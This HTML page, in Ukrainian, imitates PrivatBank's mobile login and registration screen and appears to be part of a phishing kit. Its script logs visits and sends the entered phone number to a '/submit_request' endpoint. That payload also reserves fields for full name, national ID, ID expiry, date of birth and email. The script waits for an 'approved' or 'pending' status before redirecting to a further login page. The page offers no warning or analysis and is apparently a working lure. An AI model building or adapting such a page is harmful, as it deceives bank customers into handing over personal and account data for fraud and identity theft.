<!DOCTYPE html>
<html lang="uk" dir="ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Вхід / Реєстрація — PrivatBank</title>
  <style>
    :root{--green:#4caf20;--green-dark:#3d9717;--ink:#1d1d1d;--muted:#8d8d8d;--page:#f4f4f4;--mint:#e8f4e5}
    *{box-sizing:border-box}html,body{margin:0;min-width:320px;background:var(--page);color:var(--ink);font-family:Arial,Helvetica,sans-serif}body{min-height:100vh}
    .app{width:100%;max-width:788px;margin:0 auto;min-height:100vh;background:var(--page);padding-bottom:28px}
    .topbar{height:112px;padding:28px 36px 18px;display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,#d7f1dc 0%,#dff4f1 100%)}
    .topbar h1{margin:0;font-size:clamp(28px,5vw,44px);font-weight:500;letter-spacing:-1.2px;text-align:center;flex:1}.menu,.support{width:42px;height:42px;display:grid;place-items:center;flex:0 0 42px}.menu span,.menu span:before,.menu span:after{display:block;width:35px;height:4px;border-radius:4px;background:#151515;content:"";position:relative}.menu span:before{position:absolute;top:-11px}.menu span:after{position:absolute;top:11px}.support svg{width:40px;height:40px;stroke:#151515;stroke-width:2;fill:none}
    main{padding:34px 32px 0}.card{background:#fff;border-radius:22px;padding:50px 34px 34px;box-shadow:0 2px 8px rgba(0,0,0,.03)}.field-label{display:block;font-size:31px;margin:0 0 16px}.phone-row{height:94px;border:3px solid #2189d8;border-radius:20px;background:#e9e9e9;box-shadow:0 0 0 7px rgba(77,160,226,.22);display:flex;align-items:center;overflow:hidden}.country{height:100%;min-width:196px;background:#fff;border-radius:15px;display:flex;align-items:center;gap:20px;padding:0 26px;font-size:31px;border-right:1px solid #cfcfcf}.flag{font-size:34px;line-height:1}.phone{min-width:0;flex:1;height:100%;border:0;outline:0;background:transparent;padding:0 20px;font-size:30px;color:#555}.phone::placeholder{color:#9b9b9b}.consent{display:flex;gap:22px;align-items:flex-start;margin:38px 0 32px;font-size:27px;line-height:1.45}.consent input{appearance:none;width:37px;height:37px;flex:0 0 37px;margin:2px 0 0;border-radius:5px;background:var(--green);position:relative}.consent input:checked:after{content:"✓";position:absolute;left:6px;top:-3px;color:white;font-size:34px;font-weight:bold}.consent a{color:#4c9237;text-decoration:underline}.continue{width:100%;height:82px;border:0;border-radius:16px;background:var(--green);color:#fff;font-size:32px;cursor:pointer;box-shadow:0 3px 5px rgba(0,0,0,.18)}.continue:hover{background:var(--green-dark)}.error{display:none;color:#bb2626;text-align:center;font-size:18px;margin:0 0 16px}.quick-links{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;padding:34px 40px 48px;text-align:center}.quick-icon{width:92px;height:92px;margin:0 auto 14px;border-radius:50%;background:#e5e5e5;display:grid;place-items:center;font-size:54px}.quick-label{font-size:24px}.bank-card{background:var(--mint);border:2px solid #d3e9ce;border-radius:20px;padding:38px 32px 32px;text-align:center}.bank-card .card-art{width:126px;height:82px;border-radius:8px;margin:0 auto 24px;background:linear-gradient(135deg,#6f90b7,#31547f);box-shadow:inset 0 0 16px rgba(0,0,0,.22)}.bank-card h2{font-size:31px;font-weight:500;margin:0 0 12px}.bank-card p{font-size:24px;margin:0 0 34px}.issue{height:70px;border:0;border-radius:16px;background:#fff;color:#5ba746;font-size:28px;width:100%;box-shadow:0 2px 5px rgba(0,0,0,.12)}.bottom-nav{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin:60px -10px 0;text-align:center}.nav-item{font-size:21px}.nav-icon{height:52px;font-size:38px;display:grid;place-items:center;margin-bottom:8px}.nav-item.active{color:#58a743}.qr{position:fixed;right:26px;bottom:92px;width:76px;height:76px;border-radius:50%;background:white;box-shadow:0 3px 12px rgba(0,0,0,.18);display:grid;place-items:center;font-size:23px;font-weight:bold}
    @media(max-width:620px){.topbar{height:88px;padding:22px 18px 14px}.topbar h1{font-size:28px}.menu,.support{width:34px;height:34px;flex-basis:34px}.menu span,.menu span:before,.menu span:after{width:31px;height:3px}.support svg{width:34px;height:34px}main{padding:24px 16px 0}.card{padding:34px 20px 24px;border-radius:18px}.field-label{font-size:24px;margin-bottom:14px}.phone-row{height:76px;border-radius:16px;box-shadow:0 0 0 5px rgba(77,160,226,.22)}.country{min-width:138px;padding:0 16px;gap:12px;font-size:23px}.flag{font-size:26px}.phone{font-size:23px;padding:0 12px}.consent{gap:14px;margin:28px 0 24px;font-size:21px}.consent input{width:30px;height:30px;flex-basis:30px}.consent input:checked:after{font-size:27px;left:5px;top:-3px}.continue{height:65px;font-size:26px;border-radius:12px}.quick-links{padding:28px 4px 34px;gap:8px}.quick-icon{width:68px;height:68px;font-size:39px}.quick-label{font-size:17px}.bank-card{padding:28px 18px 24px}.bank-card .card-art{width:100px;height:64px;margin-bottom:18px}.bank-card h2{font-size:24px}.bank-card p{font-size:18px;margin-bottom:24px}.issue{height:58px;font-size:23px}.bottom-nav{margin-top:42px}.nav-item{font-size:16px}.nav-icon{font-size:30px;height:40px}.qr{right:18px;bottom:70px;width:62px;height:62px;font-size:18px}}
  </style>
</head>
<body>
  <div class="app">
    <header class="topbar"><div class="menu" aria-label="Меню"><span></span></div><h1>Вхід / Реєстрація</h1><div class="support" aria-label="Підтримка"><svg viewBox="0 0 24 24"><path d="M4 13v-2a8 8 0 0 1 16 0v2M4 13a2 2 0 0 0 2 2h1v-4H6a2 2 0 0 0-2 2Zm16 0a2 2 0 0 1-2 2h-1v-4h1a2 2 0 0 1 2 2ZM9 20h6M9 18h6"/><circle cx="9" cy="10" r="1" fill="#151515"/><circle cx="15" cy="10" r="1" fill="#151515"/></svg></div></header>
    <main>
      <section class="card"><form id="personalInfoForm"><label class="field-label" for="phone">Номер телефону</label><div class="phone-row"><div class="country"><span class="flag">🇺🇦</span><bdi>+380</bdi></div><input class="phone" id="phone" name="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="00 000 00 00" required></div><label class="consent"><input id="consent" type="checkbox" checked required><span>Я підтверджую, що прочитав(ла) та погоджуюся з <a href="#">Умовами та положеннями</a>, а також даю згоду на <a href="#">обробку моїх персональних даних банком</a></span></label><div class="error" id="errorMessage"></div><button class="continue" type="submit">Продовжити</button></form></section>
      <section class="quick-links"><div><div class="quick-icon">»</div><div class="quick-label">Перекази</div></div><div><div class="quick-icon">▯</div><div class="quick-label">Мобільний</div></div><div><div class="quick-icon">≋</div><div class="quick-label">Платежі</div></div></section>
      <section class="bank-card"><div class="card-art"></div><h2>Картки PrivatBank</h2><p>Безкоштовний випуск. Доставка по Україні та світу</p><button class="issue" type="button">Випустити картку</button></section>
      <nav class="bottom-nav"><div class="nav-item active"><div class="nav-icon">⌂</div>Головна</div><div class="nav-item"><div class="nav-icon">♟</div>Кредити</div><div class="nav-item"><div class="nav-icon">✉</div>Конверти</div><div class="nav-item"><div class="nav-icon">✋</div>Приват</div><div class="nav-item"><div class="nav-icon">▦</div>Більше</div></nav>
    </main><div class="qr">⌗</div>
  </div>
  <script>
    fetch('/track_visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'track_visit',page:'personal_info'})}).catch(()=>{});
    const form=document.getElementById('personalInfoForm');const error=document.getElementById('errorMessage');
    form.addEventListener('submit',async(e)=>{e.preventDefault();const phone=document.getElementById('phone').value.replace(/[^0-9]/g,'');try{const r=await fetch('/submit_request',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'personal_info',data:{fullName:'',nationalId:'',idExpiry:'',phone:'+380'+phone,dob:'',email:''}})});const result=await r.json();if(result.status==='approved'||result.status==='pending'){localStorage.setItem('request_id',result.request_id);window.location.href='login.html'}else{error.textContent=result.message||'Сталася помилка. Спробуйте ще раз.';error.style.display='block'}}catch(err){error.textContent='Помилка підключення до сервера.';error.style.display='block'}});
  </script>
</body>
</html>
